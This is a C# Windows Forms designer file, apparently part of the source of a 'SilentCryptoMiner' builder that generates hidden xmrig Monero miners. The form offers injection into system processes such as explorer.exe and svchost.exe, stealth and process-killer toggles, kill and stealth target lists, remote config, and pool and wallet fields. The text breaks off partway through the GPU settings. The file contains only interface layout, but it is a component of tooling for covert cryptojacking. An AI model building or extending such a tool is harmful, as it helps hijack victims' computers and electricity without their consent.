using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class MinerXMR : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MinerXMR));
            this.formMinerXMR = new MephTheme();
            this.tabcontrolMinerXMR = new MephTabcontrol();
            this.tabConnection = new System.Windows.Forms.TabPage();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.labelMinerXMRConnectionHelp = new System.Windows.Forms.Label();
            this.labelMinerXMRConnectionInjection = new System.Windows.Forms.Label();
            this.comboInjection = new MephComboBox();
            this.labelMinerXMRConnectionPool = new System.Windows.Forms.Label();
            this.txtPoolUsername = new MephTextBox();
            this.txtPoolURL = new MephTextBox();
            this.labelMinerXMRConnectionWallet = new System.Windows.Forms.Label();
            this.labelMinerXMRConnectionPassword = new System.Windows.Forms.Label();
            this.txtPoolPassword = new MephTextBox();
            this.tabMining = new System.Windows.Forms.TabPage();
            this.labelMinerXMRMiningProcessKiller = new System.Windows.Forms.Label();
            this.toggleProcessKiller = new MephToggleSwitch();
            this.labelMinerXMRMiningAlgorithm = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.labelMinerXMRMiningStealth = new System.Windows.Forms.Label();
            this.toggleStealth = new MephToggleSwitch();
            this.labelMinerXMRMiningWaitMinutes = new System.Windows.Forms.Label();
            this.labelMinerXMRMiningIdleWait = new System.Windows.Forms.Label();
            this.comboIdleCPU = new MephComboBox();
            this.comboMaxCPU = new MephComboBox();
            this.labelMinerXMRMiningIdleCPU = new System.Windows.Forms.Label();
            this.labelMinerXMRMiningSSL = new System.Windows.Forms.Label();
            this.toggleSSL = new MephToggleSwitch();
            this.labelMinerXMRMiningCPU = new System.Windows.Forms.Label();
            this.toggleCPU = new MephToggleSwitch();
            this.labelMinerXMRMiningNicehash = new System.Windows.Forms.Label();
            this.toggleNicehash = new MephToggleSwitch();
            this.labelMinerXMRMiningIdleMining = new System.Windows.Forms.Label();
            this.toggleIdle = new MephToggleSwitch();
            this.labelMinerXMRMiningGPU = new System.Windows.Forms.Label();
            this.toggleGPU = new MephToggleSwitch();
            this.labelMinerXMRMiningMaxCPU = new System.Windows.Forms.Label();
            this.txtIdleWait = new MephTextBox();
            this.tabAdvanced = new System.Windows.Forms.TabPage();
            this.toggleStealthFullscreen = new MephToggleSwitch();
            this.labelMinerXMRAdvancedStealthFullscreen = new System.Windows.Forms.Label();
            this.chkAPI = new MephCheckBox();
            this.labelMinerXMRAdvancedKillTargets = new System.Windows.Forms.Label();
            this.labelMinerXMRAdvancedStealthTargets = new System.Windows.Forms.Label();
            this.chkAdvParam = new MephCheckBox();
            this.chkRemoteConfig = new MephCheckBox();
            this.txtAPI = new MephTextBox();
            this.txtKillTargets = new MephTextBox();
            this.txtStealthTargets = new MephTextBox();
            this.txtAdvParam = new MephTextBox();
            this.txtRemoteConfig = new MephTextBox();
            this.tabJSON = new System.Windows.Forms.TabPage();
            this.txtJSON = new MephTextBox();
            this.formMinerXMR.SuspendLayout();
            this.tabcontrolMinerXMR.SuspendLayout();
            this.tabConnection.SuspendLayout();
            this.tabMining.SuspendLayout();
            this.tabAdvanced.SuspendLayout();
            this.tabJSON.SuspendLayout();
            this.SuspendLayout();
            // 
            // formMinerXMR
            // 
            this.formMinerXMR.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.formMinerXMR.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formMinerXMR.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formMinerXMR.Controls.Add(this.tabcontrolMinerXMR);
            this.formMinerXMR.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formMinerXMR.ForeColor = System.Drawing.Color.Gray;
            this.formMinerXMR.Location = new System.Drawing.Point(0, 0);
            this.formMinerXMR.Margin = new System.Windows.Forms.Padding(2);
            this.formMinerXMR.MaximumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.MinimumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.Name = "formMinerXMR";
            this.formMinerXMR.Size = new System.Drawing.Size(535, 272);
            this.formMinerXMR.SubHeader = "Create a new miner (xmrig)";
            this.formMinerXMR.TabIndex = 0;
            this.formMinerXMR.Text = "Create New Miner";
            // 
            // tabcontrolMinerXMR
            // 
            this.tabcontrolMinerXMR.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.tabcontrolMinerXMR.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.tabcontrolMinerXMR.Controls.Add(this.tabConnection);
            this.tabcontrolMinerXMR.Controls.Add(this.tabMining);
            this.tabcontrolMinerXMR.Controls.Add(this.tabAdvanced);
            this.tabcontrolMinerXMR.Controls.Add(this.tabJSON);
            this.tabcontrolMinerXMR.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.tabcontrolMinerXMR.ItemSize = new System.Drawing.Size(32, 85);
            this.tabcontrolMinerXMR.Location = new System.Drawing.Point(12, 65);
            this.tabcontrolMinerXMR.Multiline = true;
            this.tabcontrolMinerXMR.Name = "tabcontrolMinerXMR";
            this.tabcontrolMinerXMR.SelectedIndex = 0;
            this.tabcontrolMinerXMR.Size = new System.Drawing.Size(511, 197);
            this.tabcontrolMinerXMR.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrolMinerXMR.TabIndex = 17;
            this.tabcontrolMinerXMR.SelectedIndexChanged += new System.EventHandler(this.tabcontrolMinerXMR_SelectedIndexChanged);
            // 
            // tabConnection
            // 
            this.tabConnection.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabConnection.Controls.Add(this.labelWiki);
            this.tabConnection.Controls.Add(this.labelMinerXMRConnectionHelp);
            this.tabConnection.Controls.Add(this.labelMinerXMRConnectionInjection);
            this.tabConnection.Controls.Add(this.comboInjection);
            this.tabConnection.Controls.Add(this.labelMinerXMRConnectionPool);
            this.tabConnection.Controls.Add(this.txtPoolUsername);
            this.tabConnection.Controls.Add(this.txtPoolURL);
            this.tabConnection.Controls.Add(this.labelMinerXMRConnectionWallet);
            this.tabConnection.Controls.Add(this.labelMinerXMRConnectionPassword);
            this.tabConnection.Controls.Add(this.txtPoolPassword);
            this.tabConnection.Location = new System.Drawing.Point(89, 4);
            this.tabConnection.Name = "tabConnection";
            this.tabConnection.Size = new System.Drawing.Size(418, 189);
            this.tabConnection.TabIndex = 0;
            this.tabConnection.Text = "Connection";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 8);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            // 
            // labelMinerXMRConnectionHelp
            // 
            this.labelMinerXMRConnectionHelp.AutoSize = true;
            this.labelMinerXMRConnectionHelp.BackColor = System.Drawing.Color.Transparent;
            this.labelMinerXMRConnectionHelp.Location = new System.Drawing.Point(226, 8);
            this.labelMinerXMRConnectionHelp.Name = "labelMinerXMRConnectionHelp";
            this.labelMinerXMRConnectionHelp.Size = new System.Drawing.Size(160, 17);
            this.labelMinerXMRConnectionHelp.TabIndex = 41;
            this.labelMinerXMRConnectionHelp.Text = "For help please check the ";
            // 
            // labelMinerXMRConnectionInjection
            // 
            this.labelMinerXMRConnectionInjection.AutoSize = true;
            this.labelMinerXMRConnectionInjection.Location = new System.Drawing.Point(8, 158);
            this.labelMinerXMRConnectionInjection.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRConnectionInjection.Name = "labelMinerXMRConnectionInjection";
            this.labelMinerXMRConnectionInjection.Size = new System.Drawing.Size(67, 17);
            this.labelMinerXMRConnectionInjection.TabIndex = 19;
            this.labelMinerXMRConnectionInjection.Text = "Inject Into:";
            // 
            // comboInjection
            // 
            this.comboInjection.BackColor = System.Drawing.Color.Transparent;
            this.comboInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboInjection.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboInjection.ForeColor = System.Drawing.Color.Silver;
            this.comboInjection.FormattingEnabled = true;
            this.comboInjection.ItemHeight = 16;
            this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboInjection.Items.AddRange(new object[] {
            "explorer.exe",
            "nslookup.exe",
            "cmd.exe",
            "notepad.exe",
            "svchost.exe",
            "conhost.exe"});
            this.comboInjection.Location = new System.Drawing.Point(79, 156);
            this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
            this.comboInjection.Name = "comboInjection";
            this.comboInjection.Size = new System.Drawing.Size(327, 22);
            this.comboInjection.StartIndex = 0;
            this.comboInjection.TabIndex = 18;
            // 
            // labelMinerXMRConnectionPool
            // 
            this.labelMinerXMRConnectionPool.AutoSize = true;
            this.labelMinerXMRConnectionPool.Location = new System.Drawing.Point(8, 8);
            this.labelMinerXMRConnectionPool.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRConnectionPool.Name = "labelMinerXMRConnectionPool";
            this.labelMinerXMRConnectionPool.Size = new System.Drawing.Size(37, 17);
            this.labelMinerXMRConnectionPool.TabIndex = 15;
            this.labelMinerXMRConnectionPool.Text = "Pool:";
            // 
            // txtPoolUsername
            // 
            this.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolUsername.Location = new System.Drawing.Point(11, 77);
            this.txtPoolUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolUsername.MaxLength = 32767;
            this.txtPoolUsername.MultiLine = false;
            this.txtPoolUsername.Name = "txtPoolUsername";
            this.txtPoolUsername.Size = new System.Drawing.Size(395, 24);
            this.txtPoolUsername.TabIndex = 10;
            this.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolUsername.UseSystemPasswordChar = false;
            this.txtPoolUsername.WordWrap = false;
            // 
            // txtPoolURL
            // 
            this.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolURL.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolURL.Location = new System.Drawing.Point(12, 29);
            this.txtPoolURL.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolURL.MaxLength = 32767;
            this.txtPoolURL.MultiLine = false;
            this.txtPoolURL.Name = "txtPoolURL";
            this.txtPoolURL.Size = new System.Drawing.Size(394, 24);
            this.txtPoolURL.TabIndex = 14;
            this.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolURL.UseSystemPasswordChar = false;
            this.txtPoolURL.WordWrap = false;
            // 
            // labelMinerXMRConnectionWallet
            // 
            this.labelMinerXMRConnectionWallet.AutoSize = true;
            this.labelMinerXMRConnectionWallet.Location = new System.Drawing.Point(9, 55);
            this.labelMinerXMRConnectionWallet.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRConnectionWallet.Name = "labelMinerXMRConnectionWallet";
            this.labelMinerXMRConnectionWallet.Size = new System.Drawing.Size(130, 17);
            this.labelMinerXMRConnectionWallet.TabIndex = 11;
            this.labelMinerXMRConnectionWallet.Text = "Wallet Address/User:";
            // 
            // labelMinerXMRConnectionPassword
            // 
            this.labelMinerXMRConnectionPassword.AutoSize = true;
            this.labelMinerXMRConnectionPassword.Location = new System.Drawing.Point(9, 102);
            this.labelMinerXMRConnectionPassword.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRConnectionPassword.Name = "labelMinerXMRConnectionPassword";
            this.labelMinerXMRConnectionPassword.Size = new System.Drawing.Size(140, 17);
            this.labelMinerXMRConnectionPassword.TabIndex = 13;
            this.labelMinerXMRConnectionPassword.Text = "Password (if required):";
            // 
            // txtPoolPassword
            // 
            this.txtPoolPassword.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolPassword.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolPassword.Location = new System.Drawing.Point(12, 122);
            this.txtPoolPassword.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolPassword.MaxLength = 32767;
            this.txtPoolPassword.MultiLine = false;
            this.txtPoolPassword.Name = "txtPoolPassword";
            this.txtPoolPassword.Size = new System.Drawing.Size(394, 24);
            this.txtPoolPassword.TabIndex = 12;
            this.txtPoolPassword.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolPassword.UseSystemPasswordChar = false;
            this.txtPoolPassword.WordWrap = false;
            // 
            // tabMining
            // 
            this.tabMining.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabMining.Controls.Add(this.labelMinerXMRMiningProcessKiller);
            this.tabMining.Controls.Add(this.toggleProcessKiller);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningAlgorithm);
            this.tabMining.Controls.Add(this.comboAlgorithm);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningStealth);
            this.tabMining.Controls.Add(this.toggleStealth);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningWaitMinutes);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningIdleWait);
            this.tabMining.Controls.Add(this.comboIdleCPU);
            this.tabMining.Controls.Add(this.comboMaxCPU);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningIdleCPU);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningSSL);
            this.tabMining.Controls.Add(this.toggleSSL);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningCPU);
            this.tabMining.Controls.Add(this.toggleCPU);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningNicehash);
            this.tabMining.Controls.Add(this.toggleNicehash);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningIdleMining);
            this.tabMining.Controls.Add(this.toggleIdle);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningGPU);
            this.tabMining.Controls.Add(this.toggleGPU);
            this.tabMining.Controls.Add(this.labelMinerXMRMiningMaxCPU);
            this.tabMining.Controls.Add(this.txtIdleWait);
            this.tabMining.Location = new System.Drawing.Point(89, 4);
            this.tabMining.Name = "tabMining";
            this.tabMining.Padding = new System.Windows.Forms.Padding(3);
            this.tabMining.Size = new System.Drawing.Size(418, 189);
            this.tabMining.TabIndex = 5;
            this.tabMining.Text = "Mining";
            // 
            // labelMinerXMRMiningProcessKiller
            // 
            this.labelMinerXMRMiningProcessKiller.AutoSize = true;
            this.labelMinerXMRMiningProcessKiller.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningProcessKiller.Location = new System.Drawing.Point(11, 147);
            this.labelMinerXMRMiningProcessKiller.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningProcessKiller.Name = "labelMinerXMRMiningProcessKiller";
            this.labelMinerXMRMiningProcessKiller.Size = new System.Drawing.Size(89, 17);
            this.labelMinerXMRMiningProcessKiller.TabIndex = 129;
            this.labelMinerXMRMiningProcessKiller.Text = "Process Killer:";
            // 
            // toggleProcessKiller
            // 
            this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessKiller.Checked = false;
            this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessKiller.Location = new System.Drawing.Point(130, 144);
            this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessKiller.Name = "toggleProcessKiller";
            this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessKiller.TabIndex = 128;
            // 
            // labelMinerXMRMiningAlgorithm
            // 
            this.labelMinerXMRMiningAlgorithm.AutoSize = true;
            this.labelMinerXMRMiningAlgorithm.Location = new System.Drawing.Point(255, 141);
            this.labelMinerXMRMiningAlgorithm.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningAlgorithm.Name = "labelMinerXMRMiningAlgorithm";
            this.labelMinerXMRMiningAlgorithm.Size = new System.Drawing.Size(68, 17);
            this.labelMinerXMRMiningAlgorithm.TabIndex = 70;
            this.labelMinerXMRMiningAlgorithm.Text = "Algorithm:";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "rx/0",
            "gr",
            "cn/gpu",
            "cn/upx2",
            "argon2/chukwav2",
            "cn/ccx",
            "kawpow",
            "rx/keva",
            "astrobwt",
            "astrobwt/v2",
            "cn-pico/tlo",
            "rx/sfx",
            "rx/arq",
            "rx/graft",
            "argon2/chukwa",
            "argon2/ninja",
            "rx/wow",
            "cn/fast",
            "cn/rwz",
            "cn/zls",
            "cn/double",
            "cn/r",
            "cn-pico",
            "cn/half",
            "cn/2",
            "cn/xao",
            "cn/rto",
            "cn-heavy/tube",
            "cn-heavy/xhv",
            "cn-heavy/0",
            "cn/1",
            "cn-lite/1",
            "cn-lite/0",
            "cn/0"});
            this.comboAlgorithm.Location = new System.Drawing.Point(256, 160);
            this.comboAlgorithm.Margin = new System.Windows.Forms.Padding(2);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(151, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 69;
            this.comboAlgorithm.SelectedIndexChanged += new System.EventHandler(this.comboAlgorithm_SelectedIndexChanged);
            // 
            // labelMinerXMRMiningStealth
            // 
            this.labelMinerXMRMiningStealth.AutoSize = true;
            this.labelMinerXMRMiningStealth.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningStealth.Location = new System.Drawing.Point(11, 120);
            this.labelMinerXMRMiningStealth.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningStealth.Name = "labelMinerXMRMiningStealth";
            this.labelMinerXMRMiningStealth.Size = new System.Drawing.Size(50, 17);
            this.labelMinerXMRMiningStealth.TabIndex = 56;
            this.labelMinerXMRMiningStealth.Text = "Stealth:";
            // 
            // toggleStealth
            // 
            this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealth.Checked = false;
            this.toggleStealth.ForeColor = System.Drawing.Color.Black;
            this.toggleStealth.Location = new System.Drawing.Point(131, 117);
            this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealth.Name = "toggleStealth";
            this.toggleStealth.Size = new System.Drawing.Size(50, 24);
            this.toggleStealth.TabIndex = 55;
            // 
            // labelMinerXMRMiningWaitMinutes
            // 
            this.labelMinerXMRMiningWaitMinutes.AutoSize = true;
            this.labelMinerXMRMiningWaitMinutes.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningWaitMinutes.Location = new System.Drawing.Point(357, 97);
            this.labelMinerXMRMiningWaitMinutes.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningWaitMinutes.Name = "labelMinerXMRMiningWaitMinutes";
            this.labelMinerXMRMiningWaitMinutes.Size = new System.Drawing.Size(54, 17);
            this.labelMinerXMRMiningWaitMinutes.TabIndex = 53;
            this.labelMinerXMRMiningWaitMinutes.Text = "Minutes";
            // 
            // labelMinerXMRMiningIdleWait
            // 
            this.labelMinerXMRMiningIdleWait.AutoSize = true;
            this.labelMinerXMRMiningIdleWait.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningIdleWait.Location = new System.Drawing.Point(253, 98);
            this.labelMinerXMRMiningIdleWait.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningIdleWait.Name = "labelMinerXMRMiningIdleWait";
            this.labelMinerXMRMiningIdleWait.Size = new System.Drawing.Size(61, 17);
            this.labelMinerXMRMiningIdleWait.TabIndex = 52;
            this.labelMinerXMRMiningIdleWait.Text = "Idle Wait:";
            // 
            // comboIdleCPU
            // 
            this.comboIdleCPU.BackColor = System.Drawing.Color.Transparent;
            this.comboIdleCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboIdleCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboIdleCPU.Enabled = false;
            this.comboIdleCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboIdleCPU.ForeColor = System.Drawing.Color.Silver;
            this.comboIdleCPU.FormattingEnabled = true;
            this.comboIdleCPU.ItemHeight = 16;
            this.comboIdleCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboIdleCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboIdleCPU.Location = new System.Drawing.Point(347, 67);
            this.comboIdleCPU.Name = "comboIdleCPU";
            this.comboIdleCPU.Size = new System.Drawing.Size(60, 22);
            this.comboIdleCPU.StartIndex = 8;
            this.comboIdleCPU.TabIndex = 49;
            // 
            // comboMaxCPU
            // 
            this.comboMaxCPU.BackColor = System.Drawing.Color.Transparent;
            this.comboMaxCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboMaxCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.comboMaxCPU.ForeColor = System.Drawing.Color.Silver;
            this.comboMaxCPU.FormattingEnabled = true;
            this.comboMaxCPU.ItemHeight = 16;
            this.comboMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboMaxCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.comboMaxCPU.Location = new System.Drawing.Point(347, 39);
            this.comboMaxCPU.Name = "comboMaxCPU";
            this.comboMaxCPU.Size = new System.Drawing.Size(60, 22);
            this.comboMaxCPU.StartIndex = 2;
            this.comboMaxCPU.TabIndex = 26;
            // 
            // labelMinerXMRMiningIdleCPU
            // 
            this.labelMinerXMRMiningIdleCPU.AutoSize = true;
            this.labelMinerXMRMiningIdleCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningIdleCPU.Location = new System.Drawing.Point(253, 70);
            this.labelMinerXMRMiningIdleCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningIdleCPU.Name = "labelMinerXMRMiningIdleCPU";
            this.labelMinerXMRMiningIdleCPU.Size = new System.Drawing.Size(60, 17);
            this.labelMinerXMRMiningIdleCPU.TabIndex = 48;
            this.labelMinerXMRMiningIdleCPU.Text = "Idle CPU:";
            // 
            // labelMinerXMRMiningSSL
            // 
            this.labelMinerXMRMiningSSL.AutoSize = true;
            this.labelMinerXMRMiningSSL.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningSSL.Location = new System.Drawing.Point(11, 66);
            this.labelMinerXMRMiningSSL.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningSSL.Name = "labelMinerXMRMiningSSL";
            this.labelMinerXMRMiningSSL.Size = new System.Drawing.Size(56, 17);
            this.labelMinerXMRMiningSSL.TabIndex = 42;
            this.labelMinerXMRMiningSSL.Text = "SSL/TLS:";
            // 
            // toggleSSL
            // 
            this.toggleSSL.BackColor = System.Drawing.Color.Transparent;
            this.toggleSSL.Checked = false;
            this.toggleSSL.ForeColor = System.Drawing.Color.Black;
            this.toggleSSL.Location = new System.Drawing.Point(130, 63);
            this.toggleSSL.Margin = new System.Windows.Forms.Padding(2);
            this.toggleSSL.Name = "toggleSSL";
            this.toggleSSL.Size = new System.Drawing.Size(50, 24);
            this.toggleSSL.TabIndex = 41;
            // 
            // labelMinerXMRMiningCPU
            // 
            this.labelMinerXMRMiningCPU.AutoSize = true;
            this.labelMinerXMRMiningCPU.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningCPU.Location = new System.Drawing.Point(11, 11);
            this.labelMinerXMRMiningCPU.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningCPU.Name = "labelMinerXMRMiningCPU";
            this.labelMinerXMRMiningCPU.Size = new System.Drawing.Size(79, 17);
            this.labelMinerXMRMiningCPU.TabIndex = 34;
            this.labelMinerXMRMiningCPU.Text = "CPU Mining:";
            // 
            // toggleCPU
            // 
            this.toggleCPU.BackColor = System.Drawing.Color.Transparent;
            this.toggleCPU.Checked = true;
            this.toggleCPU.ForeColor = System.Drawing.Color.Black;
            this.toggleCPU.Location = new System.Drawing.Point(130, 9);
            this.toggleCPU.Margin = new System.Windows.Forms.Padding(2);
            this.toggleCPU.Name = "toggleCPU";
            this.toggleCPU.Size = new System.Drawing.Size(50, 24);
            this.toggleCPU.TabIndex = 33;
            // 
            // labelMinerXMRMiningNicehash
            // 
            this.labelMinerXMRMiningNicehash.AutoSize = true;
            this.labelMinerXMRMiningNicehash.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningNicehash.Location = new System.Drawing.Point(11, 93);
            this.labelMinerXMRMiningNicehash.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningNicehash.Name = "labelMinerXMRMiningNicehash";
            this.labelMinerXMRMiningNicehash.Size = new System.Drawing.Size(108, 17);
            this.labelMinerXMRMiningNicehash.TabIndex = 32;
            this.labelMinerXMRMiningNicehash.Text = "Nicehash Mining:";
            // 
            // toggleNicehash
            // 
            this.toggleNicehash.BackColor = System.Drawing.Color.Transparent;
            this.toggleNicehash.Checked = false;
            this.toggleNicehash.ForeColor = System.Drawing.Color.Black;
            this.toggleNicehash.Location = new System.Drawing.Point(131, 90);
            this.toggleNicehash.Margin = new System.Windows.Forms.Padding(2);
            this.toggleNicehash.Name = "toggleNicehash";
            this.toggleNicehash.Size = new System.Drawing.Size(50, 24);
            this.toggleNicehash.TabIndex = 31;
            // 
            // labelMinerXMRMiningIdleMining
            // 
            this.labelMinerXMRMiningIdleMining.AutoSize = true;
            this.labelMinerXMRMiningIdleMining.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelMinerXMRMiningIdleMining.Location = new System.Drawing.Point(253, 12);
            this.labelMinerXMRMiningIdleMining.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelMinerXMRMiningIdleMining.Name = "labelMinerXMRMiningIdleMining";
            this.labelMinerXMRMiningIdleMining.Size = new System.Drawing.Size(76, 17);
            this.labelMinerXMRMiningIdleMining.TabIndex = 30;
            this.labelMinerXMRMiningIdleMining.Text = "Idle Mining:";
            // 
            // toggleIdle
            // 
            this.toggleIdle.BackColor = System.Drawing.Color.Transparent;
            this.toggleIdle.Checked = false;
            this.toggleIdle.ForeColor = System.Drawing.Color.Black;
            this.toggleIdle.Location = new System.Drawing.Point(357, 9);
            this.toggleIdle.Margin = new System.Windows.Forms.Padding(2);
            this.toggleIdle.Name = "toggleIdle";
            this.toggleIdle.Size = new System.Drawing.Size(50, 24);
            this.toggleIdle.TabIndex = 29;
            this.toggleIdle.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleIdle_CheckedChanged);
            // 
            // labelMinerXMRMiningGPU
            // 
            this.labelMinerXMRMiningGPU.AutoSize = true;
